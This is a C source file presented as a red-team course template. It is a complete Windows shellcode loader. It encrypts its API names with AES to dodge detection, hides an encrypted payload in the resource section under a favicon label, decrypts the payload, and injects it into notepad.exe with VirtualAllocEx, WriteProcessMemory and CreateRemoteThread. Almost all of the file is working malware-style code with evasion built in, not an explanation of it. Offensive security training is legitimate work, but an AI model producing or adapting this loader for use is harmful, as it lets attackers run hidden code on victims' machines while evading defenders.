/*

 Red Team Operator course code template
 storing payload in .rsrc section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

LPVOID (WINAPI * pVirtualAlloc)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
  DWORD dwFlags,
  DWORD th32ProcessID
);

BOOL (WINAPI * pProcess32First)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pProcess32Next)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

HRSRC (WINAPI * pFindResourceA)(
  HMODULE hModule,
  LPCSTR  lpName,
  LPCSTR  lpType
);

HGLOBAL (WINAPI * pLoadResource)(
  HMODULE hModule,
  HRSRC   hResInfo
);

LPVOID (WINAPI * pLockResource)(
  HGLOBAL hResData
);

char key [] = { 0x6d, 0x79, 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6b, 0x65, 0x65, 0x65 };

unsigned char sVirtualAllocEx[] = { 0x39, 0xb8, 0xc9, 0x71, 0xe6, 0xa7, 0x30, 0x0b, 0xd0, 0xd8, 0x1e, 0x9a, 0x61, 0x03, 0xfc, 0x87 };
unsigned char sWriteProcessMemory[] = { 0xea, 0x28, 0x0c, 0x28, 0xfa, 0xa1, 0x49, 0x82, 0x33, 0x88, 0x40, 0x88, 0x46, 0xfd, 0x00, 0xc9, 0x29, 0xbf, 0xe7, 0x78, 0x8d, 0x38, 0xef, 0x78, 0x77, 0x52, 0x76, 0xa1, 0x0b, 0x6a, 0xc6, 0x55 };
unsigned char sCreateRemoteThread [] = { 0x73, 0xd9, 0xa9, 0x13, 0x05, 0xca, 0x51, 0x29, 0xb2, 0x0c, 0x3e, 0xa2, 0x51, 0x48, 0xd4, 0x54, 0xad, 0xbe, 0x19, 0x45, 0x1b, 0x02, 0x9b, 0x2f, 0xa7, 0xcf, 0x53, 0xe5, 0xcc, 0x3a, 0xb6, 0x1b };
unsigned char sVirtualAlloc[] = { 0x1a, 0x8e, 0xad, 0xe3, 0x35, 0x0c, 0x9b, 0xb3, 0x99, 0x17, 0x14, 0xb0, 0x5b, 0xc3, 0x4e, 0x9c };
unsigned char sCreateToolhelp32Snapshot[] = { 0xbb, 0x77, 0xfd, 0x5e, 0x3c, 0xa5, 0xbe, 0xe9, 0x6c, 0x63, 0x0d, 0x9d, 0x9b, 0x45, 0x34, 0x26, 0x9f, 0xee, 0x5a, 0xde, 0x47, 0x28, 0xc4, 0x1c, 0xb0, 0x67, 0xd8, 0xbd, 0xee, 0x85, 0x2a, 0xea };
unsigned char sProcess32First[] = { 0x10, 0x7b, 0x79, 0x64, 0xd0, 0x49, 0x1b, 0xce, 0x9b, 0x0e, 0x13, 0x4f, 0x72, 0xc7, 0x69, 0x5d };
unsigned char sProcess32Next[] = { 0x20, 0x3c, 0xd1, 0x1c, 0x2c, 0x5b, 0x40, 0x09, 0x37, 0x67, 0xd2, 0x65, 0x54, 0x5d, 0xda, 0x2b };
unsigned char sFindResourceA[] = { 0x73, 0x0b, 0x5c, 0xa3, 0x29, 0xc1, 0xc6, 0x4f, 0x85, 0x21, 0x5b, 0xa5, 0x54, 0xe9, 0x46, 0x86 };
unsigned char sLoadResource[] = { 0xb3, 0x65, 0x17, 0xc7, 0x37, 0x5c, 0xb7, 0x3e, 0xe9, 0xcf, 0x54, 0x32, 0x97, 0x42, 0x4a, 0xdb };
unsigned char sLockResource[] = { 0x9c, 0x43, 0xad, 0x9b, 0x9f, 0x28, 0xe7, 0x41, 0x19, 0x9c, 0x01, 0x57, 0xcb, 0x34, 0x1a, 0xeb};

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
		AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), key, sizeof(key));		
		AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), key, sizeof(key));		
		AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), key, sizeof(key));	
		
		pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateToolhelp32Snapshot);
		pProcess32First = GetProcAddress(GetModuleHandle("kernel32.dll"), sProcess32First);
		pProcess32Next = GetProcAddress(GetModuleHandle("kernel32.dll"), sProcess32Next);
		
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
		
		
		AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
		AESDecrypt((char *) sWriteProcessMemory, sizeof (sWriteProcessMemory), key, sizeof(key));
		AESDecrypt((char *) sCreateRemoteThread, sizeof (sCreateRemoteThread), key, sizeof(key));
		
		
		
		pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"), sCreateRemoteThread);
		
		
		
        pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                WaitForSingleObject(hThread, 500);
                CloseHandle(hThread);
                return 0;
        }
        return -1;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	unsigned char * payload;
	unsigned int payload_len;
	
	
	int pid = 0;
    HANDLE hProc = NULL;
	
	AESDecrypt((char *) sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
	AESDecrypt((char *) sFindResourceA, sizeof(sFindResourceA), key, sizeof(key));
	AESDecrypt((char *) sLoadResource, sizeof(sLoadResource), key, sizeof(key));
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), key, sizeof(key));
	
	
	pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAlloc);
	pFindResourceA = GetProcAddress(GetModuleHandle("kernel32.dll"), sFindResourceA);
	pLoadResource = GetProcAddress(GetModuleHandle("kernel32.dll"), sLoadResource);
	pLockResource = GetProcAddress(GetModuleHandle("kernel32.dll"), sLockResource);
	
	// Extract payload from resources section
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payload = (char *) pLockResource(resHandle);
	payload_len = SizeofResource(NULL, res);
	
	// Allocate some memory buffer for payload
	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
	//printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy payload to new memory buffer
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// Decrypt (AES) the payload
	AESDecrypt((char *) exec_mem, payload_len, key, sizeof(key));
	

	//printf("\nHit me!\n");
	getchar();
	
	//Injection Process Starts Here
	pid = FindTarget("notepad.exe");

	if (pid) {
		//printf("Notepad.exe PID = %d\n", pid);

		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		
		if (hProc != NULL) {
			Inject(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
